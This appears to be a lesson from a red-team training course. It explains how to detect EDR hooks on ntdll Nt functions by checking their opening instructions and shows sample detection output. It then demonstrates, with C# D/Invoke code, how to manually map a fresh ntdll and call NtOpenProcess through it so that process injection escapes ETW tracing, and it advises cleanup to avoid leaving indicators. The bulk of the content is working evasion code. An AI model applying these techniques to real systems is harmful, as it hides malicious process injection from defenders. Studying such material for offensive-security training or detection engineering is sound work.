If you already have code-execution capabilities on a machine running an EDR, can figure out which APIs are hooked by reading our processes memory space.  [Matt Hand](https://twitter.com/matterpreter) came up with a simple (yet elegant) approach which he published in his [HookDetector](https://github.com/matterpreter/OffensiveCSharp/blob/master/HookDetector/Program.cs) project.  It's based on the premise that the instructions for Nt APIs always start the same way:

```asm
mov r10, rcx
mov eax ...
```

We can find our functions of interest within the instance of ntdll loaded into our process, read the first 4 bytes and compare them to this known pattern.  If they don't match, we can conclude that they're hooked.  Another great "feature" is that this implementation doesn't rely on API that may itself be hooked (such as NtReadVirtualMemory).

Make sure the driver is loaded, then run the tool.  You should get output like this:

```shell
NTDLL Base Address: 0x7FFF29370000
    NtClose                   0x7FFF2940ECE0 - SAFE
    NtAllocateVirtualMemory   0x7FFF2940EE00  - HOOK DETECTED
    Instructions:             E9 D3 13 FE BF CC CC CC F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E C3 0F 1F 84 00 00 00 00 00
    NtAllocateVirtualMemoryEx 0x7FFF2940F9B0 - SAFE
    NtCreateThread            0x7FFF2940F4C0 - SAFE
    NtCreateThreadEx          0x7FFF29410370  - HOOK DETECTED
    Instructions:             E9 23 FF FD BF CC CC CC F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E C3 0F 1F 84 00 00 00 00 00
    NtCreateUserProcess       0x7FFF29410470 - SAFE
    NtFreeVirtualMemory       0x7FFF2940EEC0 - SAFE
    NtLoadDriver              0x7FFF29410C10 - SAFE
    NtMapViewOfSection        0x7FFF2940F000 - SAFE
    NtOpenProcess             0x7FFF2940EFC0  - HOOK DETECTED
    Instructions:             E9 B3 11 FE BF CC CC CC F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E C3 0F 1F 84 00 00 00 00 00
    NtProtectVirtualMemory    0x7FFF2940F500 - SAFE
    NtQueueApcThread          0x7FFF2940F3A0 - SAFE
    NtQueueApcThreadEx        0x7FFF29411830 - SAFE
    NtResumeThread            0x7FFF2940F540 - SAFE
    NtSetContextThread        0x7FFF29411D30 - SAFE
    NtSetInformationProcess   0x7FFF2940EE80 - SAFE
    NtSuspendThread           0x7FFF29412350 - SAFE
    NtUnloadDriver            0x7FFF29412490 - SAFE
    NtWriteVirtualMemory      0x7FFF2940F240  - HOOK DETECTED
    Instructions:             E9 F3 0F FE BF CC CC CC F6 04 25 08 03 FE 7F 01 75 03 0F 05 C3 CD 2E C3 0F 1F 84 00 00 00 00 00
```

This shows that **NtAllocateVirtualMemory**, **NtCreateThreadEx,** **NtOpenProcess** and **NtWriteVirtualMemory** are hooked.  We can also see that there are also a lot of APIs that are not hooked.  A perfectly legitimate strategy would be to use a process injection technique that utilises those unhooked APIs, and just avoid the hooked ones altogether.  However, for the purposes of this lesson we're going to explicitly demonstrate how to use these hooked APIs.

  

## Manual Mapping

Use D/Invoke's **Map.MapModuleToMemory()** method to read and map a new instance of ntdll.dll into the process.  This won't stomp over the existing ntdll in memory, but rather be mapped into a new memory region.

```csharp
var ntdll = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
```


If you can inspect the memory regions of the process in a debugger, you'll see that the module is allocated in a random piece of memory, not appearing to be backed by a module on disk.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/edr/ntdll-modulebase.png)

  

Setup the parameters for calling **NtOpenProcess** and then use **Generic.CallMappedDLLModuleExport()**, passing in the mapped ntdll module, the name of the export, and the desired parameters.

```csharp
var oa = new Data.Native.OBJECT_ATTRIBUTES();
var cid = new Data.Native.CLIENT_ID
{
    UniqueProcess = (IntPtr)1234
};

var hProcess = IntPtr.Zero;
var parameters = new object[]
{
    hProcess, Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, oa, cid
};

var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
    _ntdllMap.PEINFO,
    _ntdllMap.ModuleBase,
    "NtOpenProcess",
    typeof(Native.DELEGATES.NtOpenProcess),
    parameters,
    false);

if (status == Data.Native.NTSTATUS.Success)
    hProcess = (IntPtr)parameters[0];
```

Do this for the remaining APIs and perform the injection as before.  You should not see any of the API calls in the ETW tracing session.

	Don't forget to call **Map.FreeModule(ntdll)** to free the mapped instance of ntdll from the process after use.  There's no need to leave it lying around and may serve as an indicator.  

One downside is that D/Invoke needs to call some APIs such as **NtAllocateVirtualMemory** and **NtWriteVirtualMemory** in order to map the module into memory.